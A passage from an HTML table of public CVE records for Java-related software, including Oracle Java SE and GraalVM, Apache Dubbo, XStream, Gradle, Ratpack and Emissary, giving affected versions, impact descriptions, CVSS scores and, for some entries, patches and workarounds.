	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35603">CVE-2021-35603</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35588">CVE-2021-35588</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Java SE: 7u311, 8u301; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35586">CVE-2021-35586</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35578">CVE-2021-35578</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35567">CVE-2021-35567</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Java SE: 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via Kerberos to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Oracle GraalVM Enterprise Edition, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35565">CVE-2021-35565</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability can only be exploited by supplying data to APIs in the specified Component without using Untrusted Java Web Start applications or Untrusted Java applets, such as through a web service. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35564">CVE-2021-35564</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Keytool). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35561">CVE-2021-35561</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Utility). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35560">CVE-2021-35560</a></td>
		<td valign="top">Vulnerability in the Java SE product of Oracle Java SE (component: Deployment). The supported version that is affected is Java SE: 8u301. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 7.5 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35559">CVE-2021-35559</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35556">CVE-2021-35556</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35550">CVE-2021-35550</a></td>
		<td valign="top">Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35528">CVE-2021-35528</a></td>
		<td valign="top">Improper Access Control vulnerability in the application authentication and authorization of Hitachi Energy Retail Operations, Counterparty Settlement and Billing (CSB) allows an attacker to execute a modified signed Java Applet JAR file. A successful exploitation may lead to data extraction or modification of data inside the application. This issue affects: Hitachi Energy Retail Operations 5.7.3 and prior versions. Hitachi Energy Counterparty Settlement and Billing (CSB) 5.7.3 prior versions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-35464">CVE-2021-35464</a></td>
		<td valign="top">ForgeRock AM server before 7.0 has a Java deserialization vulnerability in the jato.pageSession parameter on multiple pages. The exploitation does not require authentication, and remote code execution can be triggered by sending a single crafted /ccversion/* request to the server. The vulnerability exists due to the usage of Sun ONE Application Framework (JATO) found in versions of Java 8 or earlier

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-34994">CVE-2021-34994</a></td>
		<td valign="top">This vulnerability allows remote attackers to execute arbitrary code on affected installations of Commvault CommCell 11.22.22. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the DataProvider class. The issue results from the lack of proper validation of a user-supplied string before executing it as JavaScript code. An attacker can leverage this vulnerability to escape the JavaScript sandbox and execute Java code in the context of NETWORK SERVICE. Was ZDI-CAN-13755.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-34539">CVE-2021-34539</a></td>
		<td valign="top">An issue was discovered in CubeCoders AMP before 2.1.1.8. A lack of validation of the Java Version setting means that an unintended executable path can be set. The result is that high-privileged users can trigger code execution.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-34371">CVE-2021-34371</a></td>
		<td valign="top">Neo4j through 3.4.18 (with the shell server enabled) exposes an RMI service that arbitrarily deserializes Java objects, e.g., through setSessionVariable. An attacker can abuse this for remote code execution because there are dependencies with exploitable gadget chains.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-33806">CVE-2021-33806</a></td>
		<td valign="top">The BDew BdLib library before 1.16.1.7 for Minecraft allows remote code execution because it deserializes untrusted data in ObjectInputStream.readObject as part of its use of Java serialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-33728">CVE-2021-33728</a></td>
		<td valign="top">A vulnerability has been identified in SINEC NMS (All versions &lt; V1.0 SP2 Update 1). The affected system allows to upload JSON objects that are deserialized to JAVA objects. Due to insecure deserialization of user-supplied content by the affected software, a privileged attacker could exploit this vulnerability by sending a crafted serialized Java object. An exploit could allow the attacker to execute arbitrary code on the device with root privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-33687">CVE-2021-33687</a></td>
		<td valign="top">SAP NetWeaver AS JAVA (Enterprise Portal), versions - 7.10, 7.20, 7.30, 7.31, 7.40, 7.50 reveals sensitive information in one of their HTTP requests, an attacker can use this in conjunction with other attacks such as XSS to steal this information.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-33670">CVE-2021-33670</a></td>
		<td valign="top">SAP NetWeaver AS for Java (Http Service Monitoring Filter), versions - 7.10, 7.11, 7.20, 7.30, 7.31, 7.40, 7.50, allows an attacker to send multiple HTTP requests with different method types thereby crashing the filter and making the HTTP server unavailable to other legitimate users leading to denial of service vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-33493">CVE-2021-33493</a></td>
		<td valign="top">The middleware component in OX App Suite through 7.10.5 allows Code Injection via Java classes in a YAML format.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-3283">CVE-2021-3283</a></td>
		<td valign="top">HashiCorp Nomad and Nomad Enterprise up to 0.12.9 exec and java task drivers can access processes associated with other tasks on the same node. Fixed in 0.12.10, and 1.0.3.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32829">CVE-2021-32829</a></td>
		<td valign="top">ZStack is open source IaaS(infrastructure as a service) software aiming to automate datacenters, managing resources of compute, storage, and networking all by APIs. Affected versions of ZStack REST API are vulnerable to post-authentication Remote Code Execution (RCE) via bypass of the Groovy shell sandbox. The REST API exposes the GET zstack/v1/batch-queries?script endpoint which is backed up by the BatchQueryAction class. Messages are represented by the APIBatchQueryMsg, dispatched to the QueryFacadeImpl facade and handled by the BatchQuery class. The HTTP request parameter script is mapped to the APIBatchQueryMsg.script property and evaluated as a Groovy script in BatchQuery.query the evaluation of the user-controlled Groovy script is sandboxed by SandboxTransformer which will apply the restrictions defined in the registered (sandbox.register()) GroovyInterceptor. Even though the sandbox heavily restricts the receiver types to a small set of allowed types, the sandbox is non effective at controlling any code placed in Java annotations and therefore vulnerable to meta-programming escapes. This issue leads to post-authenticated remote code execution. For more details see the referenced GHSL-2021-065. This issue is patched in versions 3.8.21, 3.10.8, and 4.1.0.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32828">CVE-2021-32828</a></td>
		<td valign="top">The Nuxeo Platform is an open source content management platform for building business applications. In version 11.5.109, the `oauth2` REST API is vulnerable to Reflected Cross-Site Scripting (XSS). This XSS can be escalated to Remote Code Execution (RCE) by levering the automation API.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32824">CVE-2021-32824</a></td>
		<td valign="top">Apache Dubbo is a java based, open source RPC framework. Versions prior to 2.6.10 and 2.7.10 are vulnerable to pre-auth remote code execution via arbitrary bean manipulation in the Telnet handler. The Dubbo main service port can be used to access a Telnet Handler which offers some basic methods to collect information about the providers and methods exposed by the service and it can even allow to shutdown the service. This endpoint is unprotected. Additionally, a provider method can be invoked using the `invoke` handler. This handler uses a safe version of FastJson to process the call arguments. However, the resulting list is later processed with `PojoUtils.realize` which can be used to instantiate arbitrary classes and invoke its setters. Even though FastJson is properly protected with a default blocklist, `PojoUtils.realize` is not, and an attacker can leverage that to achieve remote code execution. Versions 2.6.10 and 2.7.10 contain fixes for this issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32769">CVE-2021-32769</a></td>
		<td valign="top">Micronaut is a JVM-based, full stack Java framework designed for building JVM applications. A path traversal vulnerability exists in versions prior to 2.5.9. With a basic configuration, it is possible to access any file from a filesystem, using "/../../" in the URL. This occurs because Micronaut does not restrict file access to configured paths. The vulnerability is patched in version 2.5.9. As a workaround, do not use `**` in mapping, use only `*`, which exposes only flat structure of a directory not allowing traversal. If using Linux, another workaround is to run micronaut in chroot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32751">CVE-2021-32751</a></td>
		<td valign="top">Gradle is a build tool with a focus on build automation. In versions prior to 7.2, start scripts generated by the `application` plugin and the `gradlew` script are both vulnerable to arbitrary code execution when an attacker is able to change environment variables for the user running the script. This may impact those who use `gradlew` on Unix-like systems or use the scripts generated by Gradle in thieir application on Unix-like systems. For this vulnerability to be exploitable, an attacker needs to be able to set the value of particular environment variables and have those environment variables be seen by the vulnerable scripts. This issue has been patched in Gradle 7.2 by removing the use of `eval` and requiring the use of the `bash` shell. There are a few workarounds available. For CI/CD systems using the Gradle build tool, one may ensure that untrusted users are unable to change environment variables for the user that executes `gradlew`. If one is unable to upgrade to Gradle 7.2, one may generate a new `gradlew` script with Gradle 7.2 and use it for older versions of Gradle. Fpplications using start scripts generated by Gradle, one may ensure that untrusted users are unable to change environment variables for the user that executes the start script. A vulnerable start script could be manually patched to remove the use of `eval` or the use of environment variables that affect the application's command-line. If the application is simple enough, one may be able to avoid the use of the start scripts by running the application directly with Java command.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32647">CVE-2021-32647</a></td>
		<td valign="top">Emissary is a P2P based data-driven workflow engine. Affected versions of Emissary are vulnerable to post-authentication Remote Code Execution (RCE). The [`CreatePlace`](https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/CreatePlaceAction.java#L36) REST endpoint accepts an `sppClassName` parameter which is used to load an arbitrary class. This class is later instantiated using a constructor with the following signature: `&lt;constructor&gt;(String, String, String)`. An attacker may find a gadget (class) in the application classpath that could be used to achieve Remote Code Execution (RCE) or disrupt the application. Even though the chances to find a gadget (class) that allow arbitrary code execution are low, an attacker can still find gadgets that could potentially crash the application or leak sensitive data. As a work around disable network access to Emissary from untrusted sources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32639">CVE-2021-32639</a></td>
		<td valign="top">Emissary is a P2P-based, data-driven workflow engine. Emissary version 6.4.0 is vulnerable to Server-Side Request Forgery (SSRF). In particular, the `RegisterPeerAction` endpoint and the `AddChildDirectoryAction` endpoint are vulnerable to SSRF. This vulnerability may lead to credential leaks. Emissary version 7.0 contains a patch. As a workaround, disable network access to Emissary from untrusted sources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-32634">CVE-2021-32634</a></td>
		<td valign="top">Emissary is a distributed, peer-to-peer, data-driven workflow framework. Emissary 6.4.0 is vulnerable to Unsafe Deserialization of post-authenticated requests to the [`WorkSpaceClientEnqueue.action`](https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/WorkSpaceClientEnqueueAction.java) REST endpoint. This issue may lead to post-auth Remote Code Execution. This issue has been patched in version 6.5.0. As a workaround, one can disable network access to Emissary from untrusted sources.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-3252">CVE-2021-3252</a></td>
		<td valign="top">KACO New Energy XP100U Up to XP-JAVA 2.0 is affected by incorrect access control. Credentials will always be returned in plain-text from the local server during the KACO XP100U authentication process, regardless of whatever passwords have been provided, which leads to an information disclosure vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-3160">CVE-2021-3160</a></td>
		<td valign="top">Deserialization of untrusted data in the login page of ASSUWEB 359.3 build 1 subcomponent of ACA ASSUREX RENTES product allows a remote attacker to inject unsecure serialized Java object using a specially crafted HTTP request, resulting in an unauthenticated remote code execution on the server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-30179">CVE-2021-30179</a></td>
		<td valign="top">Apache Dubbo prior to 2.6.9 and 2.7.9 by default supports generic calls to arbitrary methods exposed by provider interfaces. These invocations are handled by the GenericFilter which will find the service and method specified in the first arguments of the invocation and use the Java Reflection API to make the final call. The signature for the $invoke or $invokeAsync methods is Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object; where the first argument is the name of the method to invoke, the second one is an array with the parameter types for the method being invoked and the third one is an array with the actual call arguments. In addition, the caller also needs to set an RPC attachment specifying that the call is a generic call and how to decode the arguments. The possible values are: - true - raw.return - nativejava - bean - protobuf-json An attacker can control this RPC attachment and set it to nativejava to force the java deserialization of the byte array located in the third argument.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29506">CVE-2021-29506</a></td>
		<td valign="top">GraphHopper is an open-source Java routing engine. In GrassHopper from version 2.0 and before version 2.4, there is a regular expression injection vulnerability that may lead to Denial of Service. This has been patched in 2.4 and 3.0 See this pull request for the fix: https://github.com/graphhopper/graphhopper/pull/2304

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29505">CVE-2021-29505</a></td>
		<td valign="top">XStream is software for serializing Java objects to XML and back again. A vulnerability in XStream versions prior to 1.4.17 may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types is affected. The vulnerability is patched in version 1.4.17.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29500">CVE-2021-29500</a></td>
		<td valign="top">bubble fireworks is an open source java package relating to Spring Framework. In bubble fireworks before version 2021.BUILD-SNAPSHOT there is a vulnerability in which the package did not properly verify the signature of JSON Web Tokens. This allows to forgery of valid JWTs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29485">CVE-2021-29485</a></td>
		<td valign="top">Ratpack is a toolkit for creating web applications. In versions prior to 1.9.0, a malicious attacker can achieve Remote Code Execution (RCE) via a maliciously crafted Java deserialization gadget chain leveraged against the Ratpack session store. If one's application does not use Ratpack's session mechanism, it is not vulnerable. Ratpack 1.9.0 introduces a strict allow-list mechanism that mitigates this vulnerability when used. Two possible workarounds exist. The simplest mitigation for users of earlier versions is to reduce the likelihood of attackers being able to write to the session data store. Alternatively or additionally, the allow-list mechanism could be manually back ported by providing an alternative implementation of `SessionSerializer` that uses an allow-list.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29480">CVE-2021-29480</a></td>
		<td valign="top">Ratpack is a toolkit for creating web applications. In versions prior to 1.9.0, the client side session module uses the application startup time as the signing key by default. This means that if an attacker can determine this time, and if encryption is not also used (which is recommended, but is not on by default), the session data could be tampered with by someone with the ability to write cookies. The default configuration is unsuitable for production use as an application restart renders all sessions invalid and is not multi-host compatible, but its use is not actively prevented. As of Ratpack 1.9.0, the default value is a securely randomly generated value, generated at application startup time. As a workaround, supply an alternative signing key, as per the documentation's recommendation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29429">CVE-2021-29429</a></td>
		<td valign="top">In Gradle before version 7.0, files created with open permissions in the system temporary directory can allow an attacker to access information downloaded by Gradle. Some builds could be vulnerable to a local information disclosure. Remote files accessed through TextResourceFactory are downloaded into the system temporary directory first. Sensitive information contained in these files can be exposed to other local users on the same system. If you do not use the `TextResourceFactory` API, you are not vulnerable. As of Gradle 7.0, uses of the system temporary directory have been moved to the Gradle User Home directory. By default, this directory is restricted to the user running the build. As a workaround, set a more restrictive umask that removes read access to other users. When files are created in the system temporary directory, they will not be accessible to other users. If you are unable to change your system's umask, you can move the Java temporary directory by setting the System Property `java.io.tmpdir`. The new path needs to limit permissions to the build user only.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29428">CVE-2021-29428</a></td>
		<td valign="top">In Gradle before version 7.0, on Unix-like systems, the system temporary directory can be created with open permissions that allow multiple users to create and delete files within it. Gradle builds could be vulnerable to a local privilege escalation from an attacker quickly deleting and recreating files in the system temporary directory. This vulnerability impacted builds using precompiled script plugins written in Kotlin DSL and tests for Gradle plugins written using ProjectBuilder or TestKit. If you are on Windows or modern versions of macOS, you are not vulnerable. If you are on a Unix-like operating system with the "sticky" bit set on your system temporary directory, you are not vulnerable. The problem has been patched and released with Gradle 7.0. As a workaround, on Unix-like operating systems, ensure that the "sticky" bit is set. This only allows the original user (or root) to delete a file. If you are unable to change the permissions of the system temporary directory, you can move the Java temporary directory by setting the System Property `java.io.tmpdir`. The new path needs to limit permissions to the build user only. For additional details refer to the referenced GitHub Security Advisory.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-29200">CVE-2021-29200</a></td>
		<td valign="top">Apache OFBiz has unsafe deserialization prior to 17.12.07 version An unauthenticated user can perform an RCE attack

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2021-28820">CVE-2021-28820</a></td>
		<td valign="top">The FTL Server (tibftlserver), FTL C API, FTL Golang API, FTL Java API, and FTL .Net API components of TIBCO Software Inc.'s TIBCO FTL - Community Edition, TIBCO FTL - Developer Edition, and TIBCO FTL - Enterprise Edition contain a vulnerability that theoretically allows a low privileged attacker with local access on the Windows operating system to insert malicious software. The affected component can be abused to execute the malicious software inserted by the attacker with the elevated privileges of the component. This vulnerability results from the affected component searching for run-time artifacts outside of the installation hierarchy. Affected releases are TIBCO Software Inc.'s TIBCO FTL - Community Edition: versions 6.5.0 and below, TIBCO FTL - Developer Edition: versions 6.5.0 and below, and TIBCO FTL - Enterprise Edition: versions 6.5.0 and below.

</td>
	</tr>
	<tr>
